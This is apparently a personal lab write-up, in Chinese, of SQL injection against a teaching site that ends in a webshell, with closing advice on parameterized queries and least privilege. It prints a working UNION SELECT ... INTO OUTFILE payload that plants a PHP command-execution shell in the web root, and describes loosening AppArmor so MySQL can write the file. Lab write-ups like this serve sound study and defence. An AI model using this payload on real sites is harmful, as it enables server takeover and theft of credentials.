ailx10说：这篇是我2021年11月写的。这次还是围着教学站点做 SQL 注入练习，只不过目标不再是查出几条数据，而是观察数据库写文件会带来什么后果。实验做到一半，MySQL 没有写入权限，事情就卡住了，我又去改 AppArmor 配置，才把后续步骤接起来。这也是这篇比较值得回头看的地方：一次利用能否成立，往往还取决于数据库权限和系统配置。笔记后面提到了参数化查询和权限控制；其中为了演示而放宽的限制，可别顺手当成正常部署方案。

---

![](/notes-assets/7bf7eaca7c7e34f5770e.jpg)

sql注入获取webshell  
寻找sql注入页面，操作数据库的地方  
向网站写入sql语句

```
' union select 1,2, '<?php system($_GET["cmd"]);?>' into outfile '/var/www/myzoo/cmd.php'
```

发现mysql没有写入权限，于是在apparmor中为mysql添加权限

```
vi /etc/apparmor.d/usr.sbin.mysqld
```

原实验为完成演示人为修改了 AppArmor 权限并重启服务。这是额外放宽的实验条件，不是 SQL 注入成立的必要条件；实际环境应保留最小权限并排查数据库与文件系统配置。

原教学站点暴露了部分数据库结构。SQL 注入能否读取或写入特定内容，取决于查询上下文、数据库配置和权限，不能仅据此推广到所有环境。

于是在网站根目录写入了cmd.php文件  
利用此文件执行我们想要做的事情  
比如：查看服务器所有文件密码或者其他的

![](/notes-assets/32a835cd9c91c7339cc7.jpg)

防护应优先使用参数化查询，将数据与 SQL 结构分离；对无法参数化的标识符采用允许列表。数据库账号和文件系统应遵循最小权限，输入校验不能替代参数化。

![](/notes-assets/13b954520119d2e09e7c.jpg)

回过头看，字符串拼接解释了漏洞怎么来，额外放宽权限解释了影响为什么变大。把这两件事分开记，才不会把特意准备的实验条件误当成所有站点的默认状态。
